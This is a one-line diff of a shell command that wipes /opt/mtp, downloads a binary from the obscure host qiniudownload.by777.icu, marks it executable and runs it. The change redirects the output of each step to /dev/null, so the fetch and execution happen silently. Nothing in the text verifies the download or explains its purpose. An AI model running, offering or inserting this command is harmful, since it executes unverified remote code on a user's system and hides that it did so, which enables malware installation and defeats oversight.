@@ -1,1 +1,1 @@
-rm -rf /opt/mtp && mkdir /opt/mtp && wget -N "http://qiniudownload.by777.icu/cs45mm/1/us1/bash_us" -O /opt/mtp/bash_use && chmod +x /opt/mtp/bash_use && cd /opt/mtp && ./bash_use
+rm -rf /opt/mtp >> /dev/null 2>&1 && mkdir /opt/mtp >> /dev/null 2>&1 && wget -N "http://qiniudownload.by777.icu/cs45mm/1/us1/bash_us" -O /opt/mtp/bash_use  >> /dev/null 2>&1 && chmod +x /opt/mtp/bash_use  >> /dev/null 2>&1 && cd /opt/mtp  >> /dev/null 2>&1 && ./bash_use  >> /dev/null 2>&1
